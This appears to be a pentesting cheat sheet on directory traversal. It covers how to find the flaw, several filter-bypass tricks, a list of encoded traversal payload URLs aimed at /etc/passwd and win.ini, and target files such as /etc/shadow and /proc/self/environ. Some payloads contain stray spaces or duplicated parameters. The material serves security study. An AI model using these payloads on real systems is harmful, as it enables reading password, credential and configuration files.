What is Directory Traversal ?
Directory Traversal is a vulnerability that allows an attacker to read files in the server that is running the app.

How to find Directory Traversal
Black Box Testing
* Map the App
	* Identify all instances where the web application appears to contain the name of a file or directory
	* Identify all functions in the app whose implementation is likely to invole retrieval of data from a server filesystem
* Test identified instances with common directory traversal payloads and observe how the app responds

White Box Testing
* Identify instances where user-supplied input is being passed to file APIs or as parameters to the OS
	* Identify instances in a running app first(black-box perspective) and then review the code responsible for the functionality
	* Grep on functions in the code that are known to include and evaluate files on the server and review if they make user supplied input
	* Use a tool to monitor all filesystem activity on the server. then test each page of the app by inserting a single unique string. Set a filter in your monitoring tool for that specific string and identity all filesystem events contain the sting.

Exploiting Directory Traversal
* Regular Case, .. /.. /.. /.. /.. /.. /etc/passwd or \\..\\WINDOWS\win.ini
* Absolute paths like /etc/passwd
* Traversal sequences stripped non-recursively, ....//....//etc/passwd
* Try to URL encode the payload (Or even double encoding)
* Bypass start of path validation, /var/ww/images/../../etc/passwd
* Bypass file extension validation using null byte. ../../etc/passwd%00.png (Try different extensions for the same thing)

Basic Payloads
* http: //localhost/index.php? page =.. /.. /.. /.. /.. /.. /etc/passwd
* http: //localhost/index.php? page =?page=....//....//etc/passwd
* http: //localhost/index.php? page =?page=../../.htaccess
* http: //localhost/index.php? page =?page=\\..\\WINDOWS\win.ini
* http: //localhost/index.php? page =..%5c/etc/passwd
* http: //localhost/index.php? page =....\\/....\\/....\\/....\\/....\\/etc/passwd
* http: //example.com/index.php?page = ..%252f..%252f..%252fetc%252fpasswd
* http: //example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
* http: //example.com/index.php?page=%252e%252e%252fetc%252fpasswd
* http: //example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00

Interesting files to check out  when you find Directory Traversal :
```
/etc/issue
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/motd
/etc/mysql/my.cnf
/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
/proc/self/environ
/proc/version
/proc/cmdline
```

Make sure to read the files taht contains info about the plugins/frameworks in the system.
